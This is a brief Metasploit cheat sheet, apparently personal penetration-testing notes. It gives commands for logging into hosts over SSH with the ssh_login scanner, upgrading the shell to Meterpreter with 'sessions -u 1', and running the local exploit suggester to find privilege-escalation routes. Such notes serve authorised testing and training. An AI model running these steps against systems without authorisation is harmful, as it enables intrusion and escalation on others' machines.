# Metasploit
### Meterpreter over SSH
1. `use auxiliary/scanner/ssh/ssh_login`
2. Set params-  `rhosts, username, password`
3. `exploit`
4. Convert shell to meterpereter - `sessions -u 1`

### Privesc suggester
* In meterpreter session - `run post/multi/recon/local_exploit_suggester`
  * Append `SHOWDESCRIPTION=true` for more info
